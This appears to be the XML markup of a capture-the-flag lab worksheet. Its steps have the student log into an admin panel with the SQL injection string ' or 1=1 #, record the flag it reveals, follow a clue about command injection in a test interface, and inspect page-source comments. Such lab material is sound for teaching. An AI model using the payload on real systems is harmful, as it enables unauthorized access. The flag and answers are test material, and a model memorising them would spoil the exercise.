        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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etu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n to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he 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ogin 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ge.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In the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ser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e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ie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,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nter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he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ollowing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2484" w:right="8363"/>
        <w:jc w:val="center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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>' or 1=1 #</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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We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 you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le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o log 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n?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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808080"/>
          <w:spacing w:val="-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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>uc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1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80808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80808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808080"/>
          <w:spacing w:val="-2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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008100B5" w:rsidRPr="008100B5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:b/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="008100B5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:b/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-5"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008100B5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r w:rsidRPr="008100B5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="008100B5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="80808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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>☐</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-5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808080"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>No</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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If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uc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ul,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urn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 t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min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ol p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nel.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Capture the Flag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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lag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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isp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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1"/>
          <w:position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3"/>
          <w:position w:val="-1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n the inte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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pacing w:val="1"/>
          <w:position w:val="-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pacing w:val="-2"/>
          <w:position w:val="-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 xml:space="preserve">ce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-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nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position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3"/>
          <w:position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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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3"/>
          <w:position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-1"/>
          <w:position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here.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="007E35E5" w:rsidRPr="007E35E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>admin_panel_sqli_bypass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Find the Clue</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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position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1"/>
          <w:position w:val="-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1"/>
          <w:position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3"/>
          <w:position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he C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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 xml:space="preserve">UE </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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2"/>
          <w:position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position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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Fl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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position w:val="-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nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> r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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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3"/>
          <w:position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1"/>
          <w:position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2"/>
          <w:position w:val="-1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ere.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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pict>
          <v:group id="_x0000_s1113" style="position:absolute;left:0;text-align:left;margin-left:125.5pt;margin-top:1.35pt;width:339pt;height:13.5pt;z-index:-1894;mso-position-horizontal-relative:page" coordorigin="2510,27" coordsize="6780,270">
            <v:shape id="_x0000_s1115" style="position:absolute;left:2520;top:37;width:6760;height:250" coordorigin="2520,37" coordsize="6760,250" path="m2520,287r6760,l9280,37r-6760,l2520,287xe" fillcolor="aqua" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1114" style="position:absolute;left:3121;top:261;width:6161;height:0" coordorigin="3121,261" coordsize="6161,0" path="m3121,261r6161,e" filled="f" strokecolor="gray" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007E35E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Check the test interface -- sloppy devs leave command injection holes ;-) --Mannie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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7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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="4466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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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iew co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ol_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nel.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hp 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ge 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urce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see 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he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br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crum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.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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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eri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y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t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ere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'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mm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ente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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-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lin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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-- TODO: Mannie script trigger? -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
